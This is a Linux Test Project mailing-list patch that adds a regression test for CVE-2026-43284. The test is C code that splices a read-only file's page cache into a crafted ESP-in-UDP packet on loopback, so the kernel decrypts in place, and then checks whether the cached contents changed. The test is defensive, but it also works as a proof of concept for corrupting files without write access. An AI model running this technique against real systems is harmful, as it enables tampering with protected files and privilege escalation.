Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 8DC84CD342F
	for <ltp@archiver.kernel.org>; Fri,  8 May 2026 09:18:33 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 476F43E2462
	for <ltp@archiver.kernel.org>; Fri,  8 May 2026 11:18:32 +0200 (CEST)
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it [217.194.8.2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 211DE3E2C29
 for <ltp@lists.linux.it>; Fri,  8 May 2026 11:17:43 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id A8D09600199
 for <ltp@lists.linux.it>; Fri,  8 May 2026 11:17:41 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 404005C71F;
 Fri,  8 May 2026 09:17:36 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1778231856; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=Ozxk3dJXv1QQLX8aoNngaMA8Joq06RXwc2hijP9JCnU=;
 b=P2v2VGQzP2cKUv/iLOr8vr55bqraATtXmqSig956KjcJcGxQ37mGMA3W9EP2zF65/PV8ZH
 /oeXo7QMI9DYJvYr7OzBCF9mIjYLRYphNDlOKR1sgzGtwhQCahrm0cuD8o6kfc4Kn9KSBV
 7HJMEVenC0E+mEl9YkfskAw8tMk916U=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1778231856;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=Ozxk3dJXv1QQLX8aoNngaMA8Joq06RXwc2hijP9JCnU=;
 b=5glP5unq7WbFLA9lxDWBgAHmbMMVhUHwtWb3izG8UEMx9CVGOtt1vA6OUBVDoktqJ55Amw
 V4x4fiumDGWvpRDQ==
Authentication-Results: smtp-out2.suse.de;
 dkim=pass header.d=suse.de header.s=susede2_rsa header.b=P2v2VGQz;
 dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=5glP5unq
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1778231856; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=Ozxk3dJXv1QQLX8aoNngaMA8Joq06RXwc2hijP9JCnU=;
 b=P2v2VGQzP2cKUv/iLOr8vr55bqraATtXmqSig956KjcJcGxQ37mGMA3W9EP2zF65/PV8ZH
 /oeXo7QMI9DYJvYr7OzBCF9mIjYLRYphNDlOKR1sgzGtwhQCahrm0cuD8o6kfc4Kn9KSBV
 7HJMEVenC0E+mEl9YkfskAw8tMk916U=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1778231856;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=Ozxk3dJXv1QQLX8aoNngaMA8Joq06RXwc2hijP9JCnU=;
 b=5glP5unq7WbFLA9lxDWBgAHmbMMVhUHwtWb3izG8UEMx9CVGOtt1vA6OUBVDoktqJ55Amw
 V4x4fiumDGWvpRDQ==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 28384593A8;
 Fri,  8 May 2026 09:17:36 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id IBHvBzCq/WnsCAAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Fri, 08 May 2026 09:17:36 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Fri, 08 May 2026 11:17:36 +0200
MIME-Version: 1.0
Message-Id: <20260508-cve-2026-43284-v1-3-bf2549d2430d@suse.com>
References: <20260508-cve-2026-43284-v1-0-bf2549d2430d@suse.com>
In-Reply-To: <20260508-cve-2026-43284-v1-0-bf2549d2430d@suse.com>
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1778231855; l=8369;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=sSlr+fOWEfxDrWL/UN+2Dg6ll6O2axvhFhWSUXnr7CA=;
 b=tjH1K4N8pzbZ3gIWiYQjeVA20hD/Cwj4O1fA8RFqKbLvEidkgp4cTIVJjD8J2Y3p2hfqhCdz5
 xnqTaNjkTk0B4gPzo7jKPho0R0OHuKX//pEypEmXiyhV6heTC0nZDIU
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000];
 R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 MIME_GOOD(-0.10)[text/plain]; MX_GOOD(-0.01)[];
 DNSWL_BLOCKED(0.00)[2a07:de40:b281:104:10:150:64:97:from];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 FUZZY_RATELIMITED(0.00)[rspamd.com]; MIME_TRACE(0.00)[0:+];
 RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
 TO_DN_ALL(0.00)[]; FROM_EQ_ENVFROM(0.00)[];
 FROM_HAS_DN(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 RCVD_COUNT_TWO(0.00)[2]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.de:dkim,suse.com:mid,suse.com:email];
 DKIM_TRACE(0.00)[suse.de:+]
X-Rspamd-Queue-Id: 404005C71F
X-Rspamd-Server: rspamd2.dmz-prg2.suse.org
X-Virus-Scanned: clamav-milter 1.0.9 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH 3/3] network/sockets: Add xfrm ESP page cache
 corruption test
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Add xfrm01 reproducer for CVE-2026-43284. When file data is spliced
into a UDP socket with ESP-in-UDP encapsulation, the kernel decrypts
the ESP payload in-place on page cache pages, corrupting cached file
contents.

The test sets up an ESP-in-UDP xfrm state on loopback, writes known
data to a file, splices it into a crafted ESP packet, and verifies
whether the page cache was corrupted.

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve                          |   1 +
 testcases/network/sockets/.gitignore |   1 +
 testcases/network/sockets/xfrm01.c   | 246 +++++++++++++++++++++++++++++++++++
 3 files changed, 248 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index 74300fb546a071ef2d1de3a02549eed35c9a57a4..530f8751ed3a8e8aa7e9110d89d577df3e8cc6ce 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -94,3 +94,4 @@ cve-2022-4378 cve-2022-4378
 cve-2025-38236 cve-2025-38236
 cve-2025-21756 cve-2025-21756
 cve-2026-31431 af_alg08
+cve-2026-43284 xfrm01
diff --git a/testcases/network/sockets/.gitignore b/testcases/network/sockets/.gitignore
new file mode 100644
index 0000000000000000000000000000000000000000..6f3c0ad84c000f0214f371c6a601afb592b15faa
--- /dev/null
+++ b/testcases/network/sockets/.gitignore
@@ -0,0 +1 @@
+/xfrm01
diff --git a/testcases/network/sockets/xfrm01.c b/testcases/network/sockets/xfrm01.c
new file mode 100644
index 0000000000000000000000000000000000000000..940d20ed3197f7d054414d662cb49b7be017b88e
--- /dev/null
+++ b/testcases/network/sockets/xfrm01.c
@@ -0,0 +1,246 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Test for CVE-2026-43284 fixed by:
+ * f4c50a4034e6 ("xfrm: esp: avoid in-place decrypt on shared skb frags")
+ *
+ * When file data is spliced into a UDP socket, the kernel uses
+ * MSG_SPLICE_PAGES to reference page cache pages directly in the skb.
+ * If the receiving socket has UDP_ENCAP_ESPINUDP enabled and a matching
+ * xfrm SA exists, the kernel's :manpage:`esp_input(7)` decrypts the
+ * ESP payload in-place on those page cache pages, corrupting the cached
+ * file contents.
+ *
+ * The test sets up an ESP-in-UDP xfrm state on loopback, writes known
+ * data to a file, splices the file data between a crafted ESP header
+ * and a fake ICV into a UDP socket, and then verifies whether the page
+ * cache was corrupted.
+ *
+ * Reproducer based on:
+ * https://github.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo
+ */
+
+#define _GNU_SOURCE
+
+#include "tst_test.h"
+#include "tst_net.h"
+#include "lapi/udp.h"
+#include "lapi/splice.h"
+
+#define TESTFILE "pagecache_test"
+#define ATKFILE "atk_data"
+
+#define DATA_SIZE 4
+#define SPI 0xdeadbeef
+#define ENC_PORT 4500
+#define IV_LEN 8
+#define ESP_HDR_SIZE 16
+#define ICV_SIZE 16
+#define AES_KEYLEN 16
+#define SALT_LEN 4
+#define KEYTOTAL (AES_KEYLEN + SALT_LEN)
+
+#define XFRM_CMD \
+	"ip xfrm state add" \
+	" src 127.0.0.1 dst 127.0.0.1" \
+	" proto esp spi 0x%08x" \
+	" encap espinudp %d %d 0.0.0.0" \
+	" aead 'rfc4106(gcm(aes))' %s 128" \
+	" replay-window 32"
+
+static const uint8_t original[DATA_SIZE] = { 'T', 'E', 'S', 'T' };
+
+static const uint8_t aead_key[KEYTOTAL] = {
+	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+	0x10, 0x11, 0x12, 0x13
+};
+
+static int file_fd = -1;
+static int recv_fd = -1;
+static int send_fd = -1;
+static int atk_fd = -1;
+static int pipefd[2] = { -1, -1 };
+
+static void setup(void)
+{
+	char keyhex[KEYTOTAL * 2 + 3];
+	char cmd[512];
+	int i, ret;
+
+	tst_setup_netns();
+
+	const char *const lo_cmd[] = {
+		"ip", "link", "set", "lo", "up", NULL
+	};
+
+	ret = tst_cmd(lo_cmd, NULL, NULL, TST_CMD_PASS_RETVAL);
+	if (ret)
+		tst_brk(TBROK, "Failed to bring up loopback interface");
+
+	keyhex[0] = '0';
+	keyhex[1] = 'x';
+	for (i = 0; i < KEYTOTAL; i++)
+		sprintf(keyhex + 2 + i * 2, "%02x", aead_key[i]);
+
+	snprintf(cmd, sizeof(cmd), XFRM_CMD, SPI, ENC_PORT, ENC_PORT, keyhex);
+
+	ret = tst_system(cmd);
+	if (ret)
+		tst_brk(TBROK, "Failed to install xfrm ESP state");
+}
+
+static void try_corrupt(void)
+{
+	struct sockaddr_in addr = {
+		.sin_family = AF_INET,
+		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
+		.sin_port = htons(ENC_PORT),
+	};
+	uint8_t esp_hdr[ESP_HDR_SIZE] = { 0 };
+	uint8_t icv[ICV_SIZE] = { 0 };
+	uint32_t spi_net = htonl(SPI);
+	uint32_t seq_net = htonl(1);
+	int encap = UDP_ENCAP_ESPINUDP;
+	loff_t off;
+
+	memcpy(esp_hdr, &spi_net, sizeof(spi_net));
+	memcpy(esp_hdr + 4, &seq_net, sizeof(seq_net));
+
+	/*
+	 * ESP header and ICV must be on different pages so that the
+	 * target file's page sits in its own frag slot in the skb.
+	 */
+	atk_fd = SAFE_OPEN(ATKFILE, O_RDWR | O_CREAT, 0600);
+	SAFE_WRITE(SAFE_WRITE_ALL, atk_fd, esp_hdr, ESP_HDR_SIZE);
+	SAFE_LSEEK(atk_fd, 4096, SEEK_SET);
+	SAFE_WRITE(SAFE_WRITE_ALL, atk_fd, icv, ICV_SIZE);
+	SAFE_FSYNC(atk_fd);
+
+	/* Evict attacker pages so splice gives fresh page references */
+	SAFE_POSIX_FADVISE(atk_fd, 0, 0, POSIX_FADV_DONTNEED);
+	SAFE_CLOSE(atk_fd);
+
+	atk_fd = SAFE_OPEN(ATKFILE, O_RDONLY);
+
+	/* UDP socket that will trigger ESP decryption on received data */
+	recv_fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);
+	SAFE_SETSOCKOPT(recv_fd, IPPROTO_UDP, UDP_ENCAP,
+			&encap, sizeof(encap));
+	SAFE_BIND(recv_fd, (struct sockaddr *)&addr, sizeof(addr));
+
+	send_fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);
+	SAFE_CONNECT(send_fd, (struct sockaddr *)&addr, sizeof(addr));
+
+	SAFE_PIPE(pipefd);
+
+	/*
+	 * Build the ESP packet in the pipe: header + target file
+	 * data + ICV. The splice for the target file places its page
+	 * cache page directly into the pipe buffer.
+	 */
+	off = 0;
+	SAFE_SPLICE(atk_fd, &off, pipefd[1], NULL,
+		    ESP_HDR_SIZE, SPLICE_F_MORE);
+
+	off = 0;
+	SAFE_SPLICE(file_fd, &off, pipefd[1], NULL,
+		    DATA_SIZE, SPLICE_F_MORE);
+
+	off = 4096;
+	SAFE_SPLICE(atk_fd, &off, pipefd[1], NULL, ICV_SIZE, 0);
+
+	/*
+	 * Splice pipe into UDP socket. The kernel uses MSG_SPLICE_PAGES
+	 * to keep the page cache references in the skb. On loopback
+	 * the recv socket's ESP handler decrypts in-place, corrupting
+	 * the page cache. May fail on patched kernels, so don't use
+	 * SAFE_SPLICE here.
+	 */
+	splice(pipefd[0], NULL, send_fd, NULL,
+	       ESP_HDR_SIZE + DATA_SIZE + ICV_SIZE, 0);
+
+	SAFE_CLOSE(pipefd[0]);
+	SAFE_CLOSE(pipefd[1]);
+	SAFE_CLOSE(recv_fd);
+	SAFE_CLOSE(send_fd);
+	SAFE_CLOSE(atk_fd);
+}
+
+static void run(void)
+{
+	uint8_t readback[DATA_SIZE];
+
+	file_fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
+	SAFE_WRITE(SAFE_WRITE_ALL, file_fd, original, DATA_SIZE);
+	SAFE_CLOSE(file_fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	try_corrupt();
+	SAFE_CLOSE(file_fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	SAFE_READ(1, file_fd, readback, sizeof(readback));
+	SAFE_CLOSE(file_fd);
+
+	if (memcmp(readback, original, DATA_SIZE) != 0)
+		tst_res(TFAIL, "Page cache was corrupted via xfrm ESP splice");
+	else
+		tst_res(TPASS, "Page cache was not corrupted");
+
+	SAFE_UNLINK(TESTFILE);
+	SAFE_UNLINK(ATKFILE);
+}
+
+static void cleanup(void)
+{
+	if (pipefd[0] != -1)
+		SAFE_CLOSE(pipefd[0]);
+
+	if (pipefd[1] != -1)
+		SAFE_CLOSE(pipefd[1]);
+
+	if (recv_fd != -1)
+		SAFE_CLOSE(recv_fd);
+
+	if (send_fd != -1)
+		SAFE_CLOSE(send_fd);
+
+	if (atk_fd != -1)
+		SAFE_CLOSE(atk_fd);
+
+	if (file_fd != -1)
+		SAFE_CLOSE(file_fd);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.cleanup = cleanup,
+	.needs_tmpdir = 1,
+	.min_kver = "6.4",
+	.needs_kconfigs = (const char *[]) {
+		"CONFIG_USER_NS=y",
+		"CONFIG_NET_NS=y",
+		"CONFIG_XFRM",
+		"CONFIG_INET_ESP",
+		"CONFIG_CRYPTO_GCM",
+		NULL
+	},
+	.save_restore = (const struct tst_path_val[]) {
+		{"/proc/sys/user/max_user_namespaces", "1024", TST_SR_SKIP},
+		{}
+	},
+	.needs_cmds = (struct tst_cmd[]) {
+		{.cmd = "ip"},
+		{}
+	},
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "f4c50a4034e6"},
+		{"CVE", "2026-43284"},
+		{}
+	},
+};

-- 
2.51.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
